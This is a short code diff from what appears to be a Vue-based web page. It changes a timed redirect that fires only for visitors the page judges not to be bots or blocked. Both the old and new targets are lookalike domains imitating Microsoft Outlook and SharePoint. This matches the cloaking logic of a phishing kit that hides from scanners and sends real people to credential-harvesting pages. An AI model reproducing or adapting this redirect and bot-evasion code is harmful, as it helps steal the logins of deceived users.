@@ -48,7 +48,7 @@ const app = createApp({
       // If not blocked or bot, proceed to the main page
       if (!isBot.value && !isBlocked.value) {
         setTimeout(() => {
-          window.location.href = 'https://outblook.cordisma.com/';
+          window.location.href = 'https://tbet.1tressboint.mom/';
         }, 3000);
       }
 
